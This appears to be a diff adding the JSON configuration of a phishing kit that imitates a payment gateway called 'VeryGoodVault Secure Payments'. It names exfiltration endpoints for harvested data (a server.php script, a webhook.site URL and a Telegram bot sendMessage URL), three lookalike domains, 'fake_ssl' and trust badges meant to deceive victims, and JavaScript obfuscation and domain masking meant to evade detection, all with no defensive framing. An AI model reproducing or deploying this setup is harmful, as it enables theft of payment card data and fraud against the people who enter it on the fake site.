@@ -1,0 +1,49 @@
+{
+  "phishing_config": {
+    "site_name": "VeryGoodVault Secure Payments",
+    "target_gateway": "js.verygoodvault.com",
+    "collection_endpoints": [
+      "/server.php",
+      "https://webhook.site/your-webhook-id",
+      "https://api.telegram.org/botTOKEN/sendMessage"
+    ],
+    "redirects": {
+      "success": "success.html",
+      "error": "error.html",
+      "timeout": "timeout.html"
+    },
+    "session_settings": {
+      "timeout_minutes": 15,
+      "heartbeat_interval": 60,
+      "data_retention_days": 30
+    },
+    "data_masking": {
+      "mask_card_middle": true,
+      "mask_cvv": true,
+      "partial_email": true
+    },
+    "security_features": {
+      "fake_ssl": true,
+      "trust_badges": true,
+      "live_chat": true,
+      "recent_transactions": true
+    }
+  },
+  "deployment": {
+    "requirements": [
+      "PHP 7.4+",
+      "HTTPS enabled",
+      ".htaccess rewrite rules"
+    ],
+    "domains": [
+      "secure-verygoodvault.com",
+      "payments-vgv.com",
+      "vgv-payment-portal.com"
+    ],
+    "obfuscation": {
+      "js_obfuscate": true,
+      "code_splitting": true,
+      "domain_masking": true
+    }
+  }
+}
